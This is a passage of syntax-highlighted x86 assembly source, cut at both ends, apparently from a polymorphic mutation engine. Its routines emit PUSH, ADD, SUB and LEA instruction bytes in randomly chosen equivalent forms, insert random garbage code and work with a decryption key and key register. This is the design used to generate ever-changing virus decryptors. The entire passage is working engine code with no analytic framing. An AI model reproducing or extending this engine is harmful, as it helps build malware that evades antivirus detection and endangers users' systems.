                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">; Don't restore EDI when we do POPAD</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">        </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">DoMOV</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoPUSHValue</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@DirectPUSH</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectPUSH</span><span class="sc0">
     </span><span class="sc5">@@Other</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectPUSH</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

     </span><span class="sc5">@@DirectPUSH</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@PUSHByte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@PUSHByte</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
       </span><span class="sc5">@@PUSHByte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

       </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DoPUSHValue</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function performs an addition of the value in EAX to the register in</span><span class="sc0">
</span><span class="sc1">;; DL. The addition can be done with:</span><span class="sc0">
</span><span class="sc1">;; ADD Reg,Value</span><span class="sc0">
</span><span class="sc1">;; LEA Reg,[Reg+Value]</span><span class="sc0">
</span><span class="sc1">;; SUB Reg,NEG(Value)</span><span class="sc0">
</span><span class="sc5">DoADD</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@NoRecursives</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SelectINC</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SelectDEC</span><span class="sc0">
        </span><span class="sc5">@@Others</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FlagNoLEA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoLEAs</span><span class="sc0">

        </span><span class="sc5">@@OtherRandom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ADDDirect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@SUBDirect</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@LEA2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVMEM</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@OtherRandom</span><span class="sc0">
     </span><span class="sc5">@@MOVMEM2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoRecursives</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADDRegMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
     </span><span class="sc5">@@MOVMEM</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoRecursives</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemValue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUBRegMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

     </span><span class="sc5">@@ADDDirect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ADDDirectEAX</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@ADDDirectByte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@ADDDirectByte</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C081h</span><span class="sc0">
       </span><span class="sc5">@@CommonWithADD1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
       </span><span class="sc5">@@ADDDirectByte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C083h</span><span class="sc0">
       </span><span class="sc5">@@CommonWithADD2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
      </span><span class="sc5">@@ADDDirectEAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

      </span><span class="sc5">@@SUBDirect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SUBDirectEAX</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@SUBDirectByte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@SUBDirectByte</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E881h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CommonWithADD1</span><span class="sc0">
        </span><span class="sc5">@@SUBDirectByte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E883h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CommonWithADD2</span><span class="sc0">
        </span><span class="sc5">@@SUBDirectEAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

      </span><span class="sc5">@@LEA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008Dh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@LEA_sb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@LEA_sb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
      </span><span class="sc5">@@LEA_sb</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
     </span><span class="sc5">@@LEA_sb2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

      </span><span class="sc5">@@LEA2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LEA</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@LEA2b</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@LEA2b</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">848Dh</span><span class="sc0">
      </span><span class="sc5">@@LEA2_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA2_X</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
      </span><span class="sc5">@@LEA2_X</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@LEA_sb2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@LEA_sb2</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

      </span><span class="sc5">@@LEA2b</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">448Dh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LEA2_Common</span><span class="sc0">

      </span><span class="sc5">@@SelectINC2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@INC01</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@NextNoRecurs</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@INC01</span><span class="sc0">
      </span><span class="sc5">@@SelectINC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@INC01</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@Others</span><span class="sc0">
       </span><span class="sc5">@@INC01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CommonWithDEC</span><span class="sc0">

      </span><span class="sc5">@@NoLEAs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ADDDirect</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@SUBDirect</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVMEM</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOVMEM2</span><span class="sc0">
                
      </span><span class="sc5">@@NoRecursives</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SelectINC2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SelectDEC2</span><span class="sc0">
      </span><span class="sc5">@@NextNoRecurs</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FlagNoLEA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoRecursives2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ADDDirect</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SUBDirect</span><span class="sc0">

      </span><span class="sc5">@@NoRecursives2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@0_</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@ADDDirect</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SUBDirect</span><span class="sc0">
         </span><span class="sc5">@@0_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@LEA</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LEA2</span><span class="sc0">
                
      </span><span class="sc5">@@SelectDEC2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DEC01</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@NextNoRecurs</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@DEC01</span><span class="sc0">

      </span><span class="sc5">@@SelectDEC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DEC01</span><span class="sc0">
